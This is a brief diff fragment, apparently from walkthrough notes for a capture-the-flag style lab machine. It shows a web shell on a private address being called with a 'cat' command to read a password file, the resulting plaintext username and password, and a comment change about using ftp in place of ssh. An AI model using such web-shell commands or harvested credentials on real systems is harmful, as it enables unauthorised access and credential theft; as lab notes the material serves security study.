@@ -173,4 +173,4 @@ Linux version 3.2.0-91-generic-pae (buildd@lgw01-15) (gcc version 4.6.3 (Ubuntu/
 # https://192.168.1.132/forum//templates_c/shell.php?cmd=cat%20/home/LOOKATME/password
 lmezard:G!@M6f4Eatau{sF"
 
-# Finally ssh connection
+# We can't connect to the ssh but we can to ftp
